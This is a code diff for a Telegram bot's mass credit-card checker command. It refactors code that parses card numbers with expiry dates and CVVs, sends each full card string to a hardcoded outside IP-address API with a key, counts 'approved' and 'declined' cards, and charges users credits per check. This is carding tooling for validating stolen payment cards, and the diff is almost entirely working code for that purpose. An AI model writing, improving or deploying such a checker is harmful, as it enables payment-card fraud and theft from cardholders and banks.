@@ -1267,74 +1267,77 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
     results = []
     total_cards = len(cards_to_check)
 
-    for raw in cards_to_check:
-        parts = raw.split("|")
-        if len(parts) != 4:
-            results.append(f"❌ Invalid card format: `{raw}`")
-            error_count += 1
-            continue
+    async with aiohttp.ClientSession() as session:  # ✅ reuse one session
+        for raw in cards_to_check:
+            parts = raw.split("|")
+            if len(parts) != 4:
+                results.append(f"❌ Invalid card format: `{raw}`")
+                error_count += 1
+                continue
 
-        # Normalize year to two digits
-        if len(parts[2]) == 4:
-            parts[2] = parts[2][-2:]
-        cc_normalized = "|".join(parts)
+            # Normalize year to two digits
+            if len(parts[2]) == 4:
+                parts[2] = parts[2][-2:]
+            cc_normalized = "|".join(parts)
 
-        api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
+            api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
 
-        try:
-            async with aiohttp.ClientSession() as session:
+            try:
                 async with session.get(api_url, timeout=25) as resp:
                     if resp.status != 200:
                         raise Exception(f"HTTP {resp.status}")
                     data = await resp.json()
-        except Exception as e:
-            results.append(f"❌ API Error for card `{cc_normalized}`: {str(e)}`")
-            error_count += 1
+            except Exception as e:
+                results.append(
+                    f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e), version=2)}"
+                )  # ✅ removed extra backtick, escaped error
+                error_count += 1
+                checked_count += 1
+                continue
+
+            api_response = data.get("status", "Unknown")
+            # ✅ safer: strip only emojis (not punctuation)
+            api_response_clean = re.sub(r'[\U00010000-\U0010ffff]', '', api_response).strip()
+
+            api_response_lower = api_response_clean.lower()
+            emoji = "❓"
+            if "approved" in api_response_lower:
+                approved_count += 1
+                emoji = "✅"
+            elif "declined" in api_response_lower or "incorrect" in api_response_lower:
+                declined_count += 1
+                emoji = "❌"
+            else:
+                error_count += 1
+
             checked_count += 1
-            continue
 
-        api_response = data.get("status", "Unknown")
-        # Remove any emoji from API response
-        api_response_clean = re.sub(r'[^\w\s\']', '', api_response).strip()
-
-        api_response_lower = api_response_clean.lower()
-        emoji = "❓"
-        if "approved" in api_response_lower:
-            approved_count += 1
-            emoji = "✅"
-        elif "declined" in api_response_lower or "incorrect" in api_response_lower:
-            declined_count += 1
-            emoji = "❌"
-        else:
-            error_count += 1
-
-        checked_count += 1
-
-        card_result = (
-            f"`{cc_normalized}`\n"  # monospace
-            f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(api_response_clean, version=2)}"
-        )
-        results.append(card_result)
-
-        current_time_taken = round(time.time() - start_time, 2)
-        current_summary = (
-            f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
-            f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
-            f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
-            f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
-            f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
-            f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
-            f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-            f"──────── ⸙ ─────────"
-        )
-        try:
-            await processing_msg.edit_text(
-                escape_markdown(current_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results),
-                parse_mode=ParseMode.MARKDOWN_V2
+            card_result = (
+                f"`{cc_normalized}`\n"
+                f"𝐒𝐭𝐚𝐭𝐮𝐬➳ {emoji} {escape_markdown(api_response_clean, version=2)}"
             )
-        except Exception:
-            pass
+            results.append(card_result)
 
+            current_time_taken = round(time.time() - start_time, 2)
+            current_summary = (
+                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
+                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
+                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
+                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
+                f"✘ 𝐄𝐫𝐫𝐨𝐫𝐬↣{error_count}\n"
+                f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken} 𝐒\n"
+                f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+                f"──────── ⸙ ─────────"
+            )
+            try:
+                await processing_msg.edit_text(
+                    escape_markdown(current_summary, version=2) + "\n\n" + "\n──────── ⸙ ─────────\n".join(results),
+                    parse_mode=ParseMode.MARKDOWN_V2
+                )
+            except Exception:
+                pass
+
+    # ✅ Final summary
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
@@ -1352,6 +1355,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
     )
 
 
+
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type == "private" and update.effective_user.id != OWNER_ID:
         await update.effective_message.reply_text(
@@ -1362,17 +1366,21 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
+    # ✅ enforce cooldown
     if not await enforce_cooldown(user_id, update):
         return
 
-    # Consume 1 credit per command
+    # ✅ consume 1 credit per command
     if not await consume_credit(user_id):
-        await update.effective_message.reply_text("❌ You have no credits left. Please buy a plan to get more credits.")
+        await update.effective_message.reply_text(
+            "❌ You have no credits left. Please buy a plan to get more credits."
+        )
         return
 
+    # ✅ extract raw cards
     raw_cards = ""
     if context.args:
-        raw_cards = ' '.join(context.args)
+        raw_cards = " ".join(context.args)
     elif update.effective_message.reply_to_message and update.effective_message.reply_to_message.text:
         raw_cards = update.effective_message.reply_to_message.text
 
@@ -1380,22 +1388,34 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text("⚠️ Usage: /mchk number|mm|yy|cvv")
         return
 
+    # ✅ card regex
     card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
     card_lines = card_pattern.findall(raw_cards)
 
     if not card_lines:
-        await update.effective_message.reply_text("⚠️ Please provide at least one card in the format: number|mm|yy|cvv.")
+        await update.effective_message.reply_text(
+            "⚠️ Please provide at least one card in the format: number|mm|yy|cvv."
+        )
         return
 
+    # ✅ limit 10
     cards_to_check = card_lines[:10]
     if len(card_lines) > 10:
         await update.effective_message.reply_text("⚠️ Only 10 cards are allowed. Checking the first 10 now.")
 
-    processing_msg = await update.effective_message.reply_text("🔎Processing...")
+    # ✅ initial processing message
+    processing_msg = await update.effective_message.reply_text("🔎 Processing...")
     start_time = time.time()
 
-    asyncio.create_task(
-        check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time)
+    # ✅ run background task safely
+    task = asyncio.create_task(
+        check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time),
+        name="card_checker"
+    )
+
+    # optional: catch exceptions in background task
+    task.add_done_callback(
+        lambda t: t.exception() and print(f"[mchk] Background error: {t.exception()}")
     )
 
 
